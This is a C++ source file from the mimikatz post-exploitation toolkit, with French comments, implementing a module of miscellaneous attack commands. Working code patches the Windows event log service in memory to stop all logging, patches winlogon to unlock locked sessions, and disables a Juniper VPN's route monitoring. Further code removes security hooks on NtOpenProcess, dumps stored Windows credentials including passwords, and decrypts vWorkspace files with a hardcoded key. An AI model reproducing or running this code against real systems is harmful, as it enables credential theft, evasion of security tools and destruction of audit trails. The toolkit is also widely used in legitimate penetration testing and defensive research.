/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "mod_mimikatz_divers.h"

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_divers::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(noroutemon,	L"noroutemon",	L"[experimental] Patch Juniper Network Connect pour ne plus superviser la table de routage"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(eventdrop,	L"eventdrop",	L"[super experimental] Patch l\'observateur d\'événements pour ne plus rien enregistrer"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(cancelator,	L"cancelator",	L"Patch le bouton annuler de Windows XP et 2003 en console pour déverrouiller une session"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(secrets,		L"secrets",		L"Affiche les secrets utilisateur"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(nodetour,	L":nodetour",	L"Anti-détours SR"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(pitme,		L":pitme",		L"Déchiffre les fichiers PIT (Quest vWorkspace Client)"));
	return monVector;
}

bool mod_mimikatz_divers::nodetour(vector<wstring> * arguments)
{
	vector<mod_patch::OS> mesOS;
	mesOS.push_back(mod_patch::WINDOWS_2003_____x64);
	mesOS.push_back(mod_patch::WINDOWS_VISTA____x64);
	mesOS.push_back(mod_patch::WINDOWS_2008_____x64);
	mesOS.push_back(mod_patch::WINDOWS_SEVEN____x64);
	mesOS.push_back(mod_patch::WINDOWS_2008r2___x64);
	
	if(mod_patch::checkVersion(&mesOS))
	{
		BYTE monSysEnterRetn[]	= {0x0f, 0x05, 0xc3};
		BYTE monDetouredStub[]	= {0x90, 0x90, 0xe9};
		
		PBYTE monNTDLLptr = reinterpret_cast<PBYTE>(GetProcAddress(GetModuleHandle(L"ntdll"), "NtOpenProcess"));
		if(memcmp(monNTDLLptr + 8, monDetouredStub, sizeof(monDetouredStub)) == 0)
		{
			(*outputStream) << L"Détour trouvé et ";
			if(mod_memory::writeMemory(monNTDLLptr + 8 + sizeof(monDetouredStub) + sizeof(LONG) + *reinterpret_cast<PLONG>(monNTDLLptr + 8 + sizeof(monDetouredStub)), monSysEnterRetn, sizeof(monSysEnterRetn)))
				(*outputStream) << L"patché :)";
			else
				(*outputStream) << L"NON patché :(";
			(*outputStream) << endl;
		}
		else
			(*outputStream) << L"Détour non trouvé" << endl;
	}
	return true;
}


bool mod_mimikatz_divers::cancelator(vector<wstring> * arguments)
{
	vector<mod_patch::OS> mesOS;
	mesOS.push_back(mod_patch::WINDOWS_XP_PRO___x86);
	mesOS.push_back(mod_patch::WINDOWS_2003_____x86);

	if(mod_patch::checkVersion(&mesOS))
	{
		BYTE patternCMPJMP[] = {0xff, 0xff, 0xff, 0x83, 0xff, 0x02, 0x0f, 0x84};
		BYTE patternNOP[] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
		long offsetCibleNOP	= 3;
	
		vector<mod_process::KIWI_PROCESSENTRY32> * mesProcesses = new vector<mod_process::KIWI_PROCESSENTRY32>();
		wstring processName = L"winlogon.exe";

		if(mod_process::getList(mesProcesses, &processName))
		{
			for(vector<mod_process::KIWI_PROCESSENTRY32>::iterator leProcess = mesProcesses->begin(); leProcess != mesProcesses->end(); leProcess++)
			{
				mod_patch::patchModuleOfPID(leProcess->th32ProcessID, L"", patternCMPJMP, sizeof(patternCMPJMP), patternNOP, sizeof(patternNOP), offsetCibleNOP);
			}
		}

		delete mesProcesses;
	}
	return true;
}


bool mod_mimikatz_divers::noroutemon(vector<wstring> * arguments)
{
	//BYTE patternTestRouteMon[]		= {0x83, 0xec, 0x1c, 0x55, 0x8b, 0xe9}; // 7.0 // 83 ec 1c 55 8b e9
	BYTE patternTestRouteMon[]		= {0x83, 0xec, 0x14, 0x53, 0x8b, 0xd9}; // 7.1 // 83 ec 14 53 8b d9
	BYTE patternNoTestRouteMon[]	= {0xb0, 0x01, 0xc2, 0x04, 0x00};
	
	mod_patch::patchModuleOfService(L"dsNcService", L"", patternTestRouteMon, sizeof(patternTestRouteMon), patternNoTestRouteMon, sizeof(patternNoTestRouteMon));
	return true;
}

bool mod_mimikatz_divers::eventdrop(vector<wstring> * arguments)
{
	wchar_t LIBNAME_WNT5_EVTLOG[] = L"eventlog.dll";
	wchar_t LIBNAME_WNT6_EVTLOG[] = L"wevtsvc.dll";
#ifdef _M_X64
	BYTE PTRN_WNT5_PerformWriteRequest[]			= {0x49, 0x89, 0x5b, 0x10, 0x49, 0x89, 0x73, 0x18};
	LONG OFFS_WNT5_PerformWriteRequest				= -10;
	BYTE PATC_WNT5_PerformWriteRequest[]			= {0x45, 0x33, 0xed, 0xc3};

	BYTE PTRN_WN60_Channel__ActualProcessEvent[]	= {0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0x48, 0x8b, 0xda, 0xe8};
	LONG OFFS_WN60_Channel__ActualProcessEvent		= 0;
	BYTE PATC_WN62_Channel__ActualProcessEvent[]	= {0xff, 0xf7, 0x48, 0x83, 0xec, 0x50, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8};
	LONG OFFS_WN62_Channel__ActualProcessEvent		= 0;

	BYTE PATC_WNT6_Channel__ActualProcessEvent[]	= {0xc3};
#elif defined _M_IX86
	BYTE PTRN_WNT5_PerformWriteRequest[]			= {0x89, 0x45, 0xe4, 0x8b, 0x7d, 0x08, 0x89, 0x7d};
	LONG OFFS_WNT5_PerformWriteRequest				= -20;
	BYTE PATC_WNT5_PerformWriteRequest[]			= {0x33, 0xc0, 0xc2, 0x04, 0x00};
		
	BYTE PTRN_WN60_Channel__ActualProcessEvent[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x56, 0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8};
	LONG OFFS_WN60_Channel__ActualProcessEvent		= 0;
	BYTE PATC_WN61_Channel__ActualProcessEvent[]	= {0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8};
	LONG OFFS_WN61_Channel__ActualProcessEvent		= -(5 + 5 + 2);
	BYTE PATC_WN62_Channel__ActualProcessEvent[]	= {0x33, 0xc4, 0x50, 0x8d, 0x44, 0x24, 0x28, 0x64, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x75, 0x0c};
	LONG OFFS_WN62_Channel__ActualProcessEvent		= -(5 + 1 + 1 + 1 + 3 + 1 + 6 + 5 + 2 + 3 + 2 + 1 + 2);

	BYTE PATC_WNO8_Channel__ActualProcessEvent[]	= {0xc2, 0x04, 0x00};
	BYTE PATC_WIN8_Channel__ActualProcessEvent[]	= {0xc2, 0x08, 0x00};
#endif

	BYTE * PTRN_Process = NULL; DWORD SIZE_PTRN_Process = 0;
	BYTE * PATC_Process = NULL; DWORD SIZE_PATC_Process = 0;
	LONG OFFS_PATC_Process = 0;
	wstring libEvent;

	if(mod_system::GLOB_Version.dwMajorVersion < 6)
	{
		libEvent.assign(LIBNAME_WNT5_EVTLOG);
		PTRN_Process = PTRN_WNT5_PerformWriteRequest; SIZE_PTRN_Process = sizeof(PTRN_WNT5_PerformWriteRequest);
		PATC_Process = PATC_WNT5_PerformWriteRequest; SIZE_PATC_Process = sizeof(PATC_WNT5_PerformWriteRequest);
		OFFS_PATC_Process = OFFS_WNT5_PerformWriteRequest;
	}
	else 
	{
		libEvent.assign(LIBNAME_WNT6_EVTLOG);
		if(mod_system::GLOB_Version.dwMinorVersion < 1)
		{
			PTRN_Process = PTRN_WN60_Channel__ActualProcessEvent; SIZE_PTRN_Process = sizeof(PTRN_WN60_Channel__ActualProcessEvent);
			OFFS_PATC_Process = OFFS_WN60_Channel__ActualProcessEvent;
#ifdef _M_X64
		}
#elif defined _M_IX86
			PATC_Process = PATC_WNO8_Channel__ActualProcessEvent; SIZE_PATC_Process = sizeof(PATC_WNO8_Channel__ActualProcessEvent);
		}
		else if(mod_system::GLOB_Version.dwMinorVersion < 2)
		{
			PTRN_Process = PATC_WN61_Channel__ActualProcessEvent; SIZE_PTRN_Process = sizeof(PATC_WN61_Channel__ActualProcessEvent);
			OFFS_PATC_Process = OFFS_WN61_Channel__ActualProcessEvent;
			PATC_Process = PATC_WNO8_Channel__ActualProcessEvent; SIZE_PATC_Process = sizeof(PATC_WNO8_Channel__ActualProcessEvent);
		}
#endif
		else
		{
			PTRN_Process = PATC_WN62_Channel__ActualProcessEvent; SIZE_PTRN_Process = sizeof(PATC_WN62_Channel__ActualProcessEvent);
			OFFS_PATC_Process = OFFS_WN62_Channel__ActualProcessEvent;
#ifdef _M_IX86
			PATC_Process = PATC_WIN8_Channel__ActualProcessEvent; SIZE_PATC_Process = sizeof(PATC_WIN8_Channel__ActualProcessEvent);
#endif
		}

#ifdef _M_X64
		PATC_Process = PATC_WNT6_Channel__ActualProcessEvent; SIZE_PATC_Process = sizeof(PATC_WNT6_Channel__ActualProcessEvent);
#endif
	}

	mod_patch::patchModuleOfService(L"EventLog", libEvent, PTRN_Process, SIZE_PTRN_Process, PATC_Process, SIZE_PATC_Process, OFFS_PATC_Process);

	return true;
}

bool mod_mimikatz_divers::secrets(vector<wstring> * arguments)
{
	DWORD credNb = 0;
	PCREDENTIAL * pCredential = NULL;
	DWORD flags = (arguments->empty() ? 0 : CRED_ENUMERATE_ALL_CREDENTIALS);

	if(CredEnumerate(NULL, flags, &credNb, &pCredential))
	{
		(*outputStream) << L"Nombre de secrets : " << credNb << endl;
		
		for(DWORD i = 0; i < credNb; i++)
		{
			wstring type;
			bool isCertificate = false;
			switch(pCredential[i]->Type)
			{
				case CRED_TYPE_GENERIC:
					type.assign(L"GENERIC");
					break;
				case CRED_TYPE_DOMAIN_PASSWORD:
					type.assign(L"DOMAIN_PASSWORD");
					break;
				case CRED_TYPE_DOMAIN_CERTIFICATE:
					type.assign(L"DOMAIN_CERTIFICATE");
					isCertificate = true;
					break;
				case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:
					type.assign(L"DOMAIN_VISIBLE_PASSWORD");
					break;
				case CRED_TYPE_GENERIC_CERTIFICATE:
					type.assign(L"GENERIC_CERTIFICAT");
					isCertificate = true;
					break;
				case CRED_TYPE_DOMAIN_EXTENDED:
					type.assign(L"DOMAIN_EXTENDED");
					break;
				default:
					type.assign(L"?");
			}

			(*outputStream) << 
				L"TargetName         : " << (pCredential[i]->TargetName ? pCredential[i]->TargetName : L"<NULL>") << L" / " << (pCredential[i]->TargetAlias ? pCredential[i]->TargetAlias : L"<NULL>") << endl <<
				L"Type               : " << type << L" (" << pCredential[i]->Type << L')' << endl <<
				L"Comment            : " << (pCredential[i]->Comment ? pCredential[i]->Comment : L"<NULL>") << endl <<
				L"UserName           : " << (pCredential[i]->UserName ? pCredential[i]->UserName : L"<NULL>") << endl << 
				L"Credential         : " << mod_text::stringOrHex(pCredential[i]->CredentialBlob, pCredential[i]->CredentialBlobSize) << endl <<
				endl;
		}
		CredFree(pCredential);
	}
	else (*outputStream) << L"CredEnumerate : " << mod_system::getWinError() << endl;
	
	return true;
}


bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
{
	static const BYTE HARDCODED_KEY[]	= {
		0x80, 0x5b, 0xe8, 0x18, 0x6f, 0x64, 0x89, 0x3a, 0x34, 0xce, 0x59, 0xdf, 0x4d, 0xb4, 0x5a, 0x0f,
		0x69, 0x94, 0x58, 0x70, 0x71, 0x4b, 0x17, 0xcf, 0xc3, 0x40, 0xaa, 0xfc, 0xc5, 0xe0, 0x21, 0xdb,
		0x9a, 0x49, 0x68, 0xb8, 0x2f, 0x4a, 0x6c, 0xdc, 0x7a, 0x8b, 0x7f, 0x5c, 0x03, 0x08, 0xfe, 0x39,
		0xa3, 0xc6, 0x31, 0xa6, 0x8c, 0xbd, 0x72, 0xa4, 0x8a, 0x1b, 0x92, 0xd5, 0x87, 0xad, 0x78, 0x8f,
		0x55, 0x96, 0x0b, 0x30, 0xa8, 0x43, 0x53, 0xb0, 0x62, 0xa0, 0xda, 0x7c, 0x13, 0x8d, 0x5d, 0x81,
		0xc0, 0x8e, 0x90, 0x88, 0xe4, 0xb7, 0x76, 0xc2, 0xb5, 0x04, 0x93, 0xa5, 0xa9, 0x9e, 0xab, 0xf5,
		0x37, 0xac, 0x99, 0x26, 0xe2, 0x38, 0x85, 0xe1, 0x74, 0x77, 0x32, 0xe5, 0x91, 0x23, 0xb1, 0x10,
		0x4c, 0x47, 0x3f, 0xbe, 0x82, 0x22, 0x6a, 0x51, 0xd0, 0x63, 0x75, 0x11, 0x33, 0x9b, 0xfb, 0x3b,
		0xca, 0xed, 0xdd, 0x44, 0xe6, 0x12, 0x4e, 0x97, 0x3c, 0x79, 0x4f, 0x41, 0x66, 0xba, 0x50, 0x0e,
		0xc9, 0x6b, 0x05, 0xee, 0x6e, 0xe7, 0x95, 0x7b, 0x60, 0x9d, 0xff, 0xc4, 0x29, 0x86, 0xb9, 0x7d,
		0x98, 0xc8, 0x9c, 0x35, 0xbb, 0xbc, 0xef, 0xfa, 0x3d, 0x06, 0xf9, 0x36, 0xbf, 0x3e, 0x7e, 0xa2,
		0xc7, 0x56, 0xae, 0xcb, 0xaf, 0xe9, 0x42, 0x61, 0xf0, 0x1d, 0xfd, 0x65, 0x9f, 0x52, 0x27, 0xea,
		0x24, 0xa1, 0xa7, 0xb2, 0x6d, 0x14, 0xb3, 0x45, 0xf8, 0xb6, 0xf7, 0x73, 0xc1, 0x83, 0x84, 0xf4,
		0xcc, 0xcd, 0xf3, 0xe3, 0x54, 0x15, 0xd1, 0x46, 0x07, 0x57, 0x2c, 0xd2, 0xd3, 0xd6, 0xd4, 0xd7,
		0xf6, 0xeb, 0xd8, 0x1c, 0x00, 0x09, 0xec, 0x67, 0x0a, 0xd9, 0x16, 0xde, 0xf1, 0xf2, 0x01, 0x2d,
		0x5e, 0x48, 0x02, 0x0c, 0x5f, 0x0d, 0x19, 0x1a, 0x28, 0x1e, 0x1f, 0x20, 0x25, 0x2a, 0x2b, 0x2e
	};
	static const DWORD SUBKEY_SIZE	= 16;
	static const BYTE HEADER_PIT[]	= {'P', 'I', 'T'};

	FILE * monFichierSource, * monFichierDestination;
	BYTE * monBuffer, * monBufferData;
	ULONG tailleFichierSource, tailleData;

	if(arguments->size() < 1)
	{
		(*outputStream) << L"divers:::pitme file.pit [file.rdp]" << endl;
	}
	else
	{
		(*outputStream) << L" * Ouverture en lecture du fichier \'" << arguments->front() << L"\' : ";
		if(monFichierSource = _wfopen(arguments->front().c_str(), L"rb"))
		{
			fseek(monFichierSource, 0, SEEK_END);
			tailleFichierSource = ftell(monFichierSource);
			monBuffer = new BYTE[tailleFichierSource];
			fseek(monFichierSource, 0, SEEK_SET);
			fread(monBuffer, tailleFichierSource, 1, monFichierSource);
			fclose(monFichierSource);

			(*outputStream) << L"OK" << endl << L" * Déchiffrement n°1 : ";
			if(mod_crypto::genericDecrypt(monBuffer, tailleFichierSource, HARDCODED_KEY, sizeof(HARDCODED_KEY), CALG_RC4))
			{
				(*outputStream) << L"OK" << endl << L" * Déchiffrement n°2 : ";
				if(mod_crypto::genericDecrypt(monBuffer, tailleFichierSource - SUBKEY_SIZE, monBuffer + tailleFichierSource - SUBKEY_SIZE, SUBKEY_SIZE, CALG_RC4))
				{
					(*outputStream) << L"OK" << endl << L" * En-tête : ";
					if(memcmp(monBuffer, HEADER_PIT, sizeof(HEADER_PIT)) == 0)
					{
						(*outputStream) << L"OK" << endl;
						monBufferData = monBuffer + sizeof(HEADER_PIT);
						tailleData = tailleFichierSource - sizeof(HEADER_PIT) - SUBKEY_SIZE;

						if(arguments->size() > 1)
						{
							(*outputStream) << L" * Ouverture en écriture du fichier \'" << arguments->back() << L"\' : ";
							if(monFichierDestination = _wfopen(arguments->back().c_str(), L"wb"))
							{
								(*outputStream) << L"OK" << endl;
								fwrite(monBufferData, tailleData, 1, monFichierDestination);
								fclose(monFichierDestination);
							}
							else (*outputStream) << L"KO" << endl;
						}
						else (*outputStream) << L" * Données : " << endl << endl << wstring(reinterpret_cast<char *>(monBufferData), reinterpret_cast<char *>(monBufferData + tailleData)) << endl;
					}
					else (*outputStream) << L"KO - différent de \'PIT\' ; " << mod_text::stringOfHex(HEADER_PIT, sizeof(HEADER_PIT)) << L" != " << mod_text::stringOfHex(monBuffer, sizeof(HEADER_PIT)) << endl;
				}
				else (*outputStream) << L"KO";
			}
			else (*outputStream) << L"KO";
			delete [] monBuffer;
		}
		else (*outputStream) << L"KO" << endl;
	}
	return true;
}